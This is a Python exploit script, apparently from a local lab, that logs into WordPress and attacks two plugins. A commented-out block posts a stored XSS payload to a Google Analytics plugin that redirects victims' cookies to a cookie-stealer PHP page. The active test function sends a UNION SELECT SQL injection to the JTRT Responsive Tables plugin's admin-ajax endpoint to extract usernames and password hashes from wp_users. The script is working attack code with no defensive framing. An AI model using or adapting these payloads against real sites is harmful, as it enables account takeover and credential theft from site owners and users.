import requests
from bs4 import BeautifulSoup
import re


session=None


def pretty_print_POST(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in
    this function because it is programmed to be pretty
    printed and may differ from the actual request.
    """
    print('{}\n{}\r\n{}\r\n\r\n{}'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))

'''
#GOOGE ANALYTICS PLUGIN XSS
url = "http://localhost/wordpress/pagina-di-esempio/"
headers = {'content-type':'application/x-www-form-urlencoded','host':'localhost'}

attack_script = '<script type="text/javascript">'\
                'var loc = \'http://127.0.0.1/cStealer/cookieStealer.php?cookies=\';'\
                'loc = loc.concat(document.cookie);'\
                'document.location=loc;' \
                '</script>'


raw_data = 'sgcgoogleanalytic='+attack_script+'&sgcwebtools=&button=Save+Changes&action=savegooglecode'
response = requests.post(url, headers = headers , data = raw_data)
'''



def login(url,username,password):
    wp_login = url+'/wp-login.php'
    wp_admin = url+'/wp-admin/'


    with requests.Session() as s:
        global session
        session=s
        headers1 = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
        datas={
            'log':username, 'pwd':password, 'wp-submit':'Log In',
            'redirect_to':wp_admin, 'testcookie':'1'
        }
        resp=s.post(wp_login, headers=headers1, data=datas)
    return loginControl(resp.text)

        #controllo se il login è stato effettuato
        #estrarre la sessione
        #con la sessione fare la nuova richiesta


def loginControl(response):
    soup=BeautifulSoup(response,'html.parser')
    div= soup.find_all('div', {"id":"login"})
    if(div):
        finalDiv=div[0].find_all('div', {"id": "login_error"})

        if(finalDiv):
            print("Login Unsuccesful!")
            return False

    print("Succesfully Logged In!")
    return True

def test(url):
    #JTRT RESPONSIVE TABLES PLUGIN

    path =url+ "/wp-admin/admin-ajax.php?action=get_old_table"

    #A LOGIN AS USER IS REQUESTED

    headers = {'content-type':'application/x-www-form-urlencoded','host':'localhost'}

    data = {"tableId":"1 UNION SELECT 1,2,CONCAT(user_login,char(58),user_pass),4,5 FROM wp_users WHERE+ID=1"}

    response = session.post(path, headers = headers , data = data)
    pretty_print_POST(response.request)

    print("STATUS CODE: ",response.status_code)
    print("TEXT: ",response.text)





